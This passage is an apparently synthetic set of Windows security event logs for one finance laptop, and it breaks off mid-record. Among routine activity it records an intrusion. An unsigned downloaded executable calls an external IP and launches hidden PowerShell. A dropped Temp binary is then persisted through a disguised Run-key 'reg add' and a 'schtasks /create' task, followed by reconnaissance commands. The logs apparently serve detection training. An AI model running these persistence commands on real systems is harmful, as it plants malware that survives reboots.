  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:42:34Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\explorer.exe",
    "image_path":"C:\\Windows\\explorer.exe",
    "parent_process":"C:\\Windows\\System32\\userinit.exe",
    "parent_pid":1240,
    "pid":4428,
    "command_line":"explorer.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"bc223344556677889900aabbccddeeff223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:45:02Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":5216,
    "command_line":"OUTLOOK.EXE",
    "registry_path":null,
    "network_ip":"10.10.5.20",
    "network_port":443,
    "action":"Process created",
    "hash_sha256":"cd33445566778899001122334455667788990011223344556677889900aabb",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T07:45:15Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":5216,
    "command_line":"OUTLOOK.EXE",
    "registry_path":null,
    "network_ip":"10.10.5.20",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"cd33445566778899001122334455667788990011223344556677889900aabb",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  }, 
  {
    "event_id":4624,
    "timestamp":"2026-07-11T07:42:11Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":"192.168.10.44",
    "network_port":0,
    "action":"User logon",
    "hash_sha256":"ab11223344556677889900aabbccddeeff11223344556677889900aabbccdd",
    "signed":true,
    "severity":"Information",
    "description":"A user authentication event was recorded.",
    "source":"Windows Security Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:42:34Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\explorer.exe",
    "image_path":"C:\\Windows\\explorer.exe",
    "parent_process":"C:\\Windows\\System32\\userinit.exe",
    "parent_pid":1240,
    "pid":4428,
    "command_line":"explorer.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"bc223344556677889900aabbccddeeff223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:44:10Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":5216,
    "command_line":"OUTLOOK.EXE",
    "registry_path":null,
    "network_ip":"10.10.5.20",
    "network_port":443,
    "action":"Process created",
    "hash_sha256":"cd33445566778899001122334455667788990011223344556677889900aabb",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T07:44:22Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":5216,
    "command_line":"OUTLOOK.EXE",
    "registry_path":null,
    "network_ip":"10.10.5.20",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"cd33445566778899001122334455667788990011223344556677889900aabb",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:46:03Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "image_path":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":6032,
    "command_line":"chrome.exe https://intranet.corp.local",
    "registry_path":null,
    "network_ip":"10.10.1.15",
    "network_port":443,
    "action":"Process created",
    "hash_sha256":"de445566778899001122334455667788990011223344556677889900aabbcc",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  }, 
  {
    "event_id":5156,
    "timestamp":"2026-07-11T07:46:21Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "image_path":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":6032,
    "command_line":"chrome.exe https://intranet.corp.local",
    "registry_path":null,
    "network_ip":"10.10.1.15",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"de445566778899001122334455667788990011223344556677889900aabbcc",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T07:51:42Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "parent_process":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_pid":5216,
    "pid":7016,
    "command_line":"WINWORD.EXE \"Q4_Financial_Report.docx\"",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"ef5566778899001122334455667788990011223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4104,
    "timestamp":"2026-07-11T07:52:01Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Microsoft-Windows-PowerShell/Operational",
    "provider":"PowerShell",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "image_path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":7440,
    "command_line":"powershell.exe Get-Date",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"PowerShell script block logged",
    "hash_sha256":"fa66778899001122334455667788990011223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"PowerShell script execution was recorded.",
    "source":"PowerShell Operational Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:03:28Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\msiexec.exe",
    "image_path":"C:\\Windows\\System32\\msiexec.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":8128,
    "command_line":"msiexec.exe /i C:\\Users\\m.wilson\\Downloads\\PrinterDriverSetup.msi",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"fb778899001122334455667788990011223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":7045,
    "timestamp":"2026-07-11T08:04:10Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"System",
    "provider":"Service Control Manager",
    "level":"Information",
    "user":"NT AUTHORITY\\SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Windows\\System32\\services.exe",
    "image_path":"C:\\Program Files\\PrinterTools\\printerservice.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":8344,
    "command_line":"printerservice.exe -service",
    "registry_path":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\PrinterTools",
    "network_ip":null,
    "network_port":null,
    "action":"Service installed",
    "hash_sha256":"ac8899001122334455667788990011223344556677889900aabbccddeeff11",
    "signed":true,
    "severity":"Information",
    "description":"A service installation event was recorded.",
    "source":"Windows Service Control Manager"
  },
  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:12:44Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\svchost.exe",
    "image_path":"C:\\Windows\\System32\\svchost.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":9020,
    "command_line":"svchost.exe -k netsvcs",
    "registry_path":"HKLM\\SYSTEM\\CurrentControlSet\\Services",
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"bd99001122334455667788990011223344556677889900aabbccddeeff1122",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4663,
    "timestamp":"2026-07-11T08:18:03Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "parent_process":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "parent_pid":5216,
    "pid":7016,
    "command_line":"WINWORD.EXE \"Q4_Financial_Report.docx\"",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"File accessed",
    "hash_sha256":"ef5566778899001122334455667788990011223344556677889900aabbccddeeff",
    "signed":true,
    "severity":"Information",
    "description":"A file access event was recorded.",
    "source":"Windows File Auditing"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:23:17Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "image_path":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":10244,
    "command_line":"Invoice_Review.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"ce001122334455667788990011223344556677889900aabbccddeeff2233",
    "signed":false,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T08:23:34Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "image_path":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":10244,
    "command_line":"Invoice_Review.exe",
    "registry_path":null,
    "network_ip":"45.77.32.18",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"ce001122334455667788990011223344556677889900aabbccddeeff2233",
    "signed":false,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:24:01Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "image_path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_process":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "parent_pid":10244,
    "pid":10488,
    "command_line":"powershell.exe -nop -w hidden",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"df1122334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4104,
    "timestamp":"2026-07-11T08:24:09Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Microsoft-Windows-PowerShell/Operational",
    "provider":"PowerShell",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "image_path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_process":"C:\\Users\\m.wilson\\Downloads\\Invoice_Review.exe",
    "parent_pid":10244,
    "pid":10488,
    "command_line":"powershell.exe -nop -w hidden",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"PowerShell script block logged",
    "hash_sha256":"df1122334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"PowerShell script execution was recorded.",
    "source":"PowerShell Operational Log"
  },

  {
    "event_id":11,
    "timestamp":"2026-07-11T08:25:12Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Microsoft-Windows-Sysmon/Operational",
    "provider":"Sysmon",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Users\\m.wilson\\AppData\\Local\\Temp\\update_cache.exe",
    "image_path":"C:\\Users\\m.wilson\\AppData\\Local\\Temp\\update_cache.exe",
    "parent_process":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_pid":10488,
    "pid":11020,
    "command_line":"update_cache.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"File created",
    "hash_sha256":"e12233445566778899001122334455667788990011223344556677889900",
    "signed":false,
    "severity":"Information",
    "description":"A file system event was recorded.",
    "source":"Sysmon File Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:27:36Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\reg.exe",
    "image_path":"C:\\Windows\\System32\\reg.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":11200,
    "pid":11344,
    "command_line":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdate /t REG_SZ /d C:\\Users\\m.wilson\\AppData\\Local\\Temp\\update_cache.exe",
    "registry_path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"f23344556677889900112233445566778899001122334455667788990011",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:30:42Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0x99AA21",
    "process_name":"C:\\Windows\\System32\\control.exe",
    "image_path":"C:\\Windows\\System32\\control.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":12044,
    "command_line":"control.exe printers",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"04455667788990011223344556677889900112233445566778899001122",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  }, 
  {
    "event_id":5156,
    "timestamp":"2026-07-11T08:35:18Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0x99AA21",
    "process_name":"C:\\Windows\\System32\\control.exe",
    "image_path":"C:\\Windows\\System32\\control.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":12044,
    "command_line":"control.exe printers",
    "registry_path":null,
    "network_ip":"10.10.1.30",
    "network_port":445,
    "action":"Network connection allowed",
    "hash_sha256":"04455667788990011223344556677889900112233445566778899001122",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:39:51Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\schtasks.exe",
    "image_path":"C:\\Windows\\System32\\schtasks.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":11200,
    "pid":12820,
    "command_line":"schtasks /query",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"15566778899001122334455667788990011223344556677889900112233",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4698,
    "timestamp":"2026-07-11T08:41:03Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\schtasks.exe",
    "image_path":"C:\\Windows\\System32\\schtasks.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":11200,
    "pid":13012,
    "command_line":"schtasks /create /tn FinanceSync /tr C:\\Users\\m.wilson\\AppData\\Local\\Temp\\update_cache.exe /sc daily",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Scheduled task created",
    "hash_sha256":"26677889900112233445566778899001122334455667788990011223344",
    "signed":true,
    "severity":"Information",
    "description":"A scheduled task creation event was recorded.",
    "source":"Windows Task Scheduler"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:44:28Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\cmd.exe",
    "image_path":"C:\\Windows\\System32\\cmd.exe",
    "parent_process":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_pid":10488,
    "pid":13420,
    "command_line":"cmd.exe /c ipconfig /all",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"37788990011223344556677889900112233445566778899001122334455",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:45:09Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\net.exe",
    "image_path":"C:\\Windows\\System32\\net.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":13420,
    "pid":13604,
    "command_line":"net user",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"48899001122334455667788990011223344556677889900112233445566",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T08:52:44Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\whoami.exe",
    "image_path":"C:\\Windows\\System32\\whoami.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":13420,
    "pid":14088,
    "command_line":"whoami /all",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"59900112233445566778899001122334455667788990011223344556677",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":11,
    "timestamp":"2026-07-11T08:57:16Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Microsoft-Windows-Sysmon/Operational",
    "provider":"Sysmon",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Users\\m.wilson\\AppData\\Roaming\\Microsoft\\Templates\\cache.dll",
    "image_path":"C:\\Users\\m.wilson\\AppData\\Roaming\\Microsoft\\Templates\\cache.dll",
    "parent_process":"C:\\Windows\\System32\\rundll32.exe",
    "parent_pid":14520,
    "pid":14604,
    "command_line":"rundll32.exe cache.dll,Start",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"File created",
    "hash_sha256":"6aa11223344556677889900112233445566778899001122334455667788",
    "signed":false,
    "severity":"Information",
    "description":"A file system event was recorded.",
    "source":"Sysmon File Monitoring"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T09:02:22Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0x99AA21",
    "process_name":"C:\\Windows\\System32\\taskmgr.exe",
    "image_path":"C:\\Windows\\System32\\taskmgr.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":15120,
    "command_line":"taskmgr.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"7bb22334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T09:05:37Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"NT AUTHORITY\\SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "image_path":"C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":16040,
    "command_line":"MsMpEng.exe",
    "registry_path":null,
    "network_ip":"20.42.65.89",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"8cc33445566778899001122334455667788990011223344556677889900",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4634,
    "timestamp":"2026-07-11T09:08:11Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0x99AA21",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"User logoff",
    "hash_sha256":"9dd44556677889900112233445566778899001122334455667788990011",
    "signed":true,
    "severity":"Information",
    "description":"A user session ended.",
    "source":"Windows Security Event Log"
  },
  {
    "event_id":4624,
    "timestamp":"2026-07-11T09:15:44Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":"192.168.10.44",
    "network_port":0,
    "action":"Administrator logon",
    "hash_sha256":"aa556677889900112233445566778899001122334455667788990011223344",
    "signed":true,
    "severity":"Information",
    "description":"A user authentication event was recorded.",
    "source":"Windows Security Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T09:17:20Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\mmc.exe",
    "image_path":"C:\\Windows\\System32\\mmc.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":17120,
    "command_line":"mmc.exe compmgmt.msc",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"bb667788990011223344556677889900112233445566778899001122334455",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":7045,
    "timestamp":"2026-07-11T09:20:14Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"System",
    "provider":"Service Control Manager",
    "level":"Information",
    "user":"NT AUTHORITY\\SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Windows\\System32\\services.exe",
    "image_path":"C:\\Program Files\\FinanceAgent\\agent.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":17440,
    "command_line":"agent.exe -service",
    "registry_path":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\FinanceAgent",
    "network_ip":null,
    "network_port":null,
    "action":"Service installed",
    "hash_sha256":"cc778899001122334455667788990011223344556677889900112233445566",
    "signed":true,
    "severity":"Information",
    "description":"A service installation event was recorded.",
    "source":"Windows Service Control Manager"
  },

  {
    "event_id":4688,
